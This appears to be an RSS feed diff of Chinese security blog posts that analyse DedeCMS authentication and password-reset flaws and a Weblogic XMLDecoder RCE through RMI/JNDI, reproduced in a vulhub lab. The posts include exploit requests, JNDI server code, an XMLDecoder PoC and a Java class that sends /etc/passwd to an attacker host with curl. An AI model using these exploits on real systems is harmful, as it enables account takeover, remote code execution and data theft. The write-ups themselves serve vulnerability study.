+&lt;p&gt;当我们传入的&lt;code&gt;last_vid&lt;/code&gt;为空的时候，&lt;code&gt;$last_vid = $uid;&lt;/code&gt;而&lt;code&gt;uid&lt;/code&gt;是我们能控制的，所以我们就能控制传给&lt;code&gt;PutCookie&lt;/code&gt;的参数，进入&lt;code&gt;PutCookie&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if ( ! function_exists(&#39;PutCookie&#39;))
+{
+    function PutCookie($key, $value, $kptime=0, $pa=&amp;quot;/&amp;quot;)
+    {
+        global $cfg_cookie_encode,$cfg_domain_cookie;
+        setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
+        setcookie($key.&#39;__ckMd5&#39;, substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在这里设置了&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/p&gt;
+
+&lt;p&gt;所以攻击流程已经明确了&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;注册一个普通用户，用户名满足&lt;code&gt;数字1+字母&lt;/code&gt;的形式，或者经过&lt;code&gt;intval()&lt;/code&gt;后值为&lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;访问用户主页，记录cookie中&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/li&gt;
+&lt;li&gt;访问index页面，替换cookie中&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值，替换成我们注册的用户名和&lt;code&gt;last_vid__ckMd5&lt;/code&gt;，就能登录到前台admin&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x03-漏洞利用&#34;&gt;0x03 漏洞利用&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;前台注册普通用户，这里注册一个&lt;code&gt;1qqqq&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;访问&lt;code&gt;/member/index.php?uid=1qqqq&lt;/code&gt;，获取&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/2izw4&#34; alt=&#34;uid&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;访问&lt;code&gt;/member/index.php&lt;/code&gt;，替换&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/3uAj1&#34; alt=&#34;admin&#34; /&gt;
+可以发现以admin身份成功登录到了前台
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/aGGc5&#34; alt=&#34;admin&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;同样的，修改密码访问&lt;code&gt;member/edit_baseinfo.php&lt;/code&gt;，还是要修改cookie值
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OacVb&#34; alt=&#34;reset passwd&#34; /&gt;
+原登录密码就是我们利用上一个漏洞修改的密码，也就是&lt;code&gt;dede_member&lt;/code&gt;表中的admin密码，这样就达到了真正修改admin的密码
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OUrvR&#34; alt=&#34;reset admin passwd&#34; /&gt;
+更新数据库的时候判断如果是管理员，就更新admin表中的数据&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h3&gt;
+
+&lt;p&gt;还是判断不够严谨，这回有两处可导致判断条件的绕过，有时候一个漏洞影响力有限的时候也不能轻视，往往配合另一处缺陷就可以造成很大的危害&lt;/p&gt;
+
+&lt;p&gt;参考：
+- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1961&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1961&lt;/a&gt;
+- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1959&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1959&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>DedeCMS V5.7 SP2 前台任意用户密码重置漏洞分析</title>
+      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Thu, 11 Jan 2018 14:12:17 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;
+
+&lt;p&gt;DEDECMS在2018-01-09更新了V5.7 SP2正式版，然后在&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;seebug&lt;/a&gt;有人提交存在前台任意用户密码修改漏洞。下面简单分析一下。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;
+
+&lt;p&gt;2018-01-09及之前的版本&lt;/p&gt;
+
+&lt;h4 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h4&gt;
+
+&lt;p&gt;问题出现在&lt;code&gt;member/resetpassword.php&lt;/code&gt;75行:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;else if($dopost == &amp;quot;safequestion&amp;quot;)
+{
+    $mid = preg_replace(&amp;quot;#[^0-9]#&amp;quot;, &amp;quot;&amp;quot;, $id);
+    $sql = &amp;quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#39;$mid&#39;&amp;quot;;
+    $row = $db-&amp;gt;GetOne($sql);
+    if(empty($safequestion)) $safequestion = &#39;&#39;;
+
+    if(empty($safeanswer)) $safeanswer = &#39;&#39;;
+
+    if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)
+    {
+        sn($mid, $row[&#39;userid&#39;], $row[&#39;email&#39;], &#39;N&#39;);
+        exit();
+    }
+    else
+    {
+        ShowMsg(&amp;quot;对不起，您的安全问题或答案回答错误&amp;quot;,&amp;quot;-1&amp;quot;);
+        exit();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;重置密码的时候需要进入&lt;code&gt;sn&lt;/code&gt;函数，在这之前进行if判断&lt;code&gt;if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)&lt;/code&gt;
+当用户没有设置安全问题和答案时&lt;code&gt;$row[&#39;safeanswer&#39;]&lt;/code&gt;为&lt;code&gt;0&lt;/code&gt;，后面一个条件成立，所以只要前面&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;成立就可以进入&lt;code&gt;sn&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;p&gt;此时默认的&lt;code&gt;$row[&#39;safequestion&#39;]&lt;/code&gt;即为&lt;code&gt;0&lt;/code&gt;，我们可以控制的变量是&lt;code&gt;$safequestion&lt;/code&gt;，在此之前还需经过&lt;code&gt;if(empty($safequestion)) $safequestion = &#39;&#39;;&lt;/code&gt;判断，如果这个if成立即当&lt;code&gt;$safequestion = &#39;&#39;&lt;/code&gt;时就不能通过前半个if判断了，所以我们要让&lt;code&gt;$safequestion&lt;/code&gt;不为空而且让&lt;code&gt;&#39;0&#39; == $safequestion&lt;/code&gt;成立&lt;/p&gt;
+
+&lt;p&gt;下面来看php中弱类型转换问题&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/edFq9&#34; alt=&#34;php&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到当我们传进&lt;code&gt;0.0&lt;/code&gt;时，&lt;code&gt;empty($safequestion)&lt;/code&gt;就不成立了，而&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;即&lt;code&gt;&#39;0&#39; == &#39;0.0&#39;&lt;/code&gt;成立，所以可以进入&lt;code&gt;sn&lt;/code&gt;方法。除了&lt;code&gt;&#39;0.0&#39;&lt;/code&gt;，&lt;code&gt;&#39;0.&#39;&lt;/code&gt; &lt;code&gt;&#39;0e123&#39;&lt;/code&gt;等都可以绕过这个判断，因为&lt;code&gt;0en&lt;/code&gt;被认为是0的n次方&lt;/p&gt;
+
+&lt;p&gt;跟进&lt;code&gt;sn&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/xZxqc&#34; alt=&#34;sn&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从数据库取出一个临时密码&lt;code&gt;SELECT * FROM #@__pwd_tmp WHERE mid = &#39;$mid&#39;&lt;/code&gt;，这里的&lt;code&gt;mid&lt;/code&gt;我们可以控制，如果用户存在，发送含有临时密码的邮件，并且有个10分钟的限制(这里为了调试方便我把时间缩短了)&lt;/p&gt;
+
+&lt;p&gt;跟进&lt;code&gt;newmail&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/0nL4H&#34; alt=&#34;newmail&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;$randval&lt;/code&gt;是一个8位随机字符串，而且先进行了md5再插入到数据库，理论上我们不好破解，但是注意85行和98行的&lt;code&gt;return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost . $cfg_memberurl . &amp;quot;/resetpassword.php?dopost=getpasswd&amp;amp;amp;id=&amp;quot; . $mid . &amp;quot;&amp;amp;amp;key=&amp;quot; . $randval);&lt;/code&gt;，把含有&lt;code&gt;$randval&lt;/code&gt;的链接直接返回显示在页面上，所以这里就没有必要去猜这个临时密码。有了这个临时密码就可以重置任意用户的密码。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;
+
+&lt;p&gt;我们先注册一个用户，然后构造一个请求，&lt;code&gt;GET /dedecms/uploads/member/resetpassword.php?i=0.0&amp;amp;dopost=safequestion&amp;amp;safequestion=0e123&amp;amp;safeanswer=&amp;amp;id=1&lt;/code&gt;，发送后可以看到页面跳转，然后返回含有key的链接，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/eSNsc&#34; alt=&#34;key&#34; /&gt;
+利用这个key可以进入重置密码流程，简单看一下&lt;/p&gt;
+
+&lt;p&gt;重置密码&lt;code&gt;/member/resetpassword.php?dopost=getpasswd&amp;amp;id=5&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/oV7zo&#34; alt=&#34;resetpwd1&#34; /&gt;
+先从&lt;code&gt;dede_pwd_tmp&lt;/code&gt;表取出&lt;code&gt;mid&lt;/code&gt;为5的临时密码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/aIWLU&#34; alt=&#34;resetpwd2&#34; /&gt;
+与传入的临时密码MD5比较，通过验证就更新用户表&lt;code&gt;dede_member&lt;/code&gt;为新的密码，同时删除临时密码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/J1mks&#34; alt=&#34;resetpwd3&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/EMzcr&#34; alt=&#34;newpwd&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样我们就可以重置任意用户的密码了——除了管理员，因为管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h4&gt;
+
+&lt;p&gt;总的来说这个漏洞不算复杂，关键点就是php弱类型安全问题，这个已经有很多案例了，同时页面跳转的过程中泄露了临时的key，实际中一个尽量避免这种关键的参数泄露。&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;https://www.seebug.org/vuldb/ssvid-97074&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Weblogic XMLDecoder RCE之RMI利用</title>
+      <link>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Tue, 09 Jan 2018 10:45:49 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;前阵子披露出的Weblogic XMLDecoder反序列化漏洞影响广泛，不少厂商都中了招，最近又捕获到不少利用这个漏洞进行挖矿的案例，实际上一开始在野外出现的利用就是挖矿程序，那时候漏洞还没被披露= =所以说有些时候黑产都快成为行业的风向标了，安全领域需要与黑灰色产业斗智斗勇，任重道远&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;这个漏洞的PoC写法灵活变种很多，这次来简单说一下利用java的远程方法调用(Remote Method Invocation, RMI)进行利用的方式&lt;/p&gt;
+
+&lt;h3 id=&#34;0x01-rmi简介&#34;&gt;0x01 RMI简介&lt;/h3&gt;
+
+&lt;p&gt;这里就直接贴一段网上的介绍&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。&lt;/p&gt;
+
+&lt;p&gt;对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。&lt;/p&gt;
+
+&lt;p&gt;RMI的传输100%基于反序列化。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;说实话有点难理解，简单说就是我们可以在远程服务器创建一个对象，然后在本地通过rmi的方式调用这个对象，如果攻击者可以控制某个方法向攻击者的服务器发起rmi请求，从而加载恶意类，就能达到远程攻击的目的。rmi属于JNDI的一种实现方式。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-本地调试&#34;&gt;0x02 本地调试&lt;/h3&gt;
+
+&lt;p&gt;这里我使用了@廖新喜的&lt;a href=&#34;http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&#34;&gt;fastjson 远程反序列化&lt;/a&gt;攻击使用的PoC，里面的JNDI服务可以满足要求&lt;/p&gt;
+
+&lt;p&gt;下载&lt;a href=&#34;https://github.com/shengqi158/fastjson-remote-code-execute-poc&#34;&gt;项目&lt;/a&gt;，在IDEA中打开，我们使用的是JNDI的服务端和客户端部分&lt;/p&gt;
+
+&lt;h4 id=&#34;远程&#34;&gt;远程&lt;/h4&gt;
+
+&lt;p&gt;首先我们在远程服务器上建立一个&lt;code&gt;Exploit&lt;/code&gt;类:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;public class Exploit {
+    public Exploit(){
+        try{
+            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Exploit e = new Exploit();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后编译为class:
+&lt;code&gt;/usr/lib/jvm/jdk1.7.0_79/bin/javac Exploit.java&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; 编译&lt;code&gt;Exploit&lt;/code&gt;的java版本需要和接下来要用的本地java版本一致，否则会导致错误&lt;/p&gt;
+
+&lt;p&gt;经过测试jdk1.8版本会有异常产生，需要额外设置&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase = True&lt;/code&gt;，所以这里建议使用jdk1.8以下版本&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/b2MmC&#34; alt=&#34;error&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;编译完成之后在VPS开启一个http服务&lt;/p&gt;
+
+&lt;h4 id=&#34;本地&#34;&gt;本地&lt;/h4&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;JNDIServer.java&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;package person.server;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+/**
+ * Created by liaoxinxi on 2017-11-6.
+ */
+
+public class JNDIServer {
+    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        //http://xxlegend.com/Exploit.class即可
+        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
+        Reference reference = new Reference(&amp;quot;Exploit&amp;quot;,
+                &amp;quot;Exploit&amp;quot;, &amp;quot;http://remote_server:80/&amp;quot;); //此处修改为自己的远程服务器
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&amp;quot;Exploit&amp;quot;, referenceWrapper);
+
+    }
+
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
+        start();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;将&lt;code&gt;factoryLocation&lt;/code&gt;指向远程&lt;code&gt;Exploit&lt;/code&gt;所在的地址，并且要以&lt;code&gt;/&lt;/code&gt;结尾，原因注释里已经说了&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;TestJNDI.java&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;package person;
+
+import javax.naming.*;
+import javax.naming.directory.DirContext;
+import javax.naming.directory.InitialDirContext;
+import java.util.Hashtable;
+
+
+/**
+ * Created by liaoxinxi on 2017-9-5.
+ */
+public class TestJNDI {
+    public static void testRmi() throws NamingException {
+        String url = &amp;quot;rmi://127.0.0.1:1099&amp;quot;;
+        Hashtable env = new Hashtable();
+        env.put(Context.PROVIDER_URL, url);
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &amp;quot;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;quot;);
+        Context context = new InitialContext(env);
+//        Object object1 = context.lookup(&amp;quot;rmi://remote_server:1099/Exploit&amp;quot;);
+        Object object = context.lookup(&amp;quot;Exploit&amp;quot;);//ok
+//        System.out.println(&amp;quot;Object:&amp;quot; + object);
+    }
+    public static void main(String[] argv) throws NamingException {
+        testRmi();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;首先测试本地JNDI服务，先运行&lt;code&gt;JNDIServer&lt;/code&gt;，可以看到在本地监听了1099端口&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OLArZ&#34; alt=&#34;1099&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后运行客户端&lt;code&gt;TestJNDI&lt;/code&gt;，可以看到VPS收到了一次请求，访问了&lt;code&gt;Exploit.class&lt;/code&gt;，接着执行了calc:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/e5ntY&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;测试成功&lt;/p&gt;
+
+&lt;p&gt;整个流程是这样的：&lt;code&gt;lookup&lt;/code&gt;方法向JNDI服务请求&lt;code&gt;Exploit&lt;/code&gt;，JNDI绑定了一个&lt;code&gt;referenceWrapper&lt;/code&gt;，而&lt;code&gt;JNDIReferences&lt;/code&gt;加载了外部对象(远程)，外部对象包含攻击载荷，本地反序列化执行&lt;/p&gt;
+
+&lt;p&gt;那我们可不可以在远程服务器开启一个JNDI服务和http服务，使应用通过&lt;code&gt;rmi://remote_server:1099/Exploit&lt;/code&gt;远程调用呢？&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-远程利用&#34;&gt;0x03 远程利用&lt;/h3&gt;
+
+&lt;p&gt;我们把项目打成jar包上传到VPS上，然后开启一个JNDI服务和http服务&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;开启JNDI服务&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;/usr/lib/jvm/jdk1.6.0_45/bin/java -jar -Djava.rmi.server.hostname=&amp;quot;192.168.1.2&amp;quot; jnditest.jar
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;
+如果此处不指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;的话会出现错误&lt;code&gt;Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;开启http服务&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后修改JNDI客户端部分，让它访问rmi远程服务&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Object object = context.lookup(&amp;quot;rmi://remote_server/Exploit&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到执行成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fcbQR&#34; alt=&#34;calc2&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-测试weblogic&#34;&gt;0x04 测试Weblogic&lt;/h3&gt;
+
+&lt;p&gt;下面我们测试一下在实战中能否利用rmi远程代码执行
+PoC&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;java version=&amp;quot;1.6.0_45&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
+    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
+        &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
+            &amp;lt;string&amp;gt;rmi://remote_server:1099/Exploit&amp;lt;/string&amp;gt;
+        &amp;lt;/void&amp;gt;
+        &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
+            &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
+        &amp;lt;/void&amp;gt;
+    &amp;lt;/void&amp;gt;
+&amp;lt;/java&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;同样的，修改rmi地址为我们自己的服务器。&lt;/p&gt;
+
+&lt;p&gt;由于vulhub搭建的Weblogic环境是基于jdk 1.6.0_45版本的，所以我们还得使用jdk 1.6重新编译项目，服务端同样也是&lt;/p&gt;
+
+&lt;p&gt;再由于目标运行在linux上，无法弹计算器，所以我们还得改Exploit类的命令部分，改成可以回显的或者反弹shell的类，这里仅供参考&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;public class Rev {
+    public Rev(){
+        try{
+            Runtime.getRuntime().exec(&amp;quot;curl -F value=@/etc/passwd remote_server:3388&amp;quot;);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv){
+        Rev e = new Rev();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd信息&lt;/p&gt;
+
+&lt;p&gt;同样的，先开启JNDI和http服务，还得再监听3388，然后发送PoC&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fjakh&#34; alt=&#34;rev&#34; /&gt;
+成功接收到信息，利用成功。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
+
+&lt;p&gt;简单总结一下这个利用方式，有几个需要注意的点&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性&lt;/p&gt;
+
+&lt;p&gt;再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置&lt;code&gt;trustURLCodebase&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;需要指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在&lt;a href=&#34;https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1&#34;&gt;stackoverflow&lt;/a&gt;和&lt;a href=&#34;http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html&#34;&gt;这里&lt;/a&gt;找到了答案。&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;参考：
+&lt;a href=&#34;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&#34;&gt;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Weblogic 0day 复现</title>
+      <link>https://kylingit.com/blog/weblogic-0day-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Fri, 22 Dec 2017 15:43:02 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/weblogic-0day-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;最近不断听到消息，大量Weblogic主机被挂挖矿病毒，起初以为是利用之前反序列化漏洞(CVE-2017-3248)，但是团队内部从受害主机捕获的攻击代码来看，这次是针对WebLogic的WLS组件，利用xmldecoder反序列漏洞进行的RCE攻击。目前官方也给出了此次漏洞的cve&lt;a href=&#34;https://www.cvedetails.com/cve/CVE-2017-10271/&#34;&gt;CVE-2017-10271&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面我们来复现一下此次的漏洞&lt;/p&gt;
+
+&lt;h4 id=&#34;0x01-环境准备&#34;&gt;0x01 环境准备&lt;/h4&gt;
+
+&lt;p&gt;我们选择docker来快速搭建漏洞环境，此次漏洞受影响的版本是10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 和 12.2.1.2.0，我们选择10.3.6来复现&lt;/p&gt;
+
+&lt;p&gt;在P神的&lt;a href=&#34;https://github.com/vulhub/vulhub&#34;&gt;vulhub&lt;/a&gt;项目中正好存在weblogic环境，看了下版本也在受影响范围之内，所以我们选择vulhub的&lt;a href=&#34;https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf&#34;&gt;weblogic&lt;/a&gt;镜像&lt;/p&gt;
+
+&lt;p&gt;克隆项目，进入weblogic目录，执行&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;docker-compose build
+docker-compose up -d
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时会创建并运行两个容器，分别是&lt;code&gt;vulhub/weblogic&lt;/code&gt;和&lt;code&gt;vulhub/weblogic&lt;/code&gt;, 如下图&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/gbF5V&#34; alt=&#34;containers&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;访问7001端口，weblogic已经成功运行&lt;/p&gt;
+
+&lt;h4 id=&#34;0x02-poc&#34;&gt;0x02 PoC&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+  &amp;lt;soapenv:Header&amp;gt;
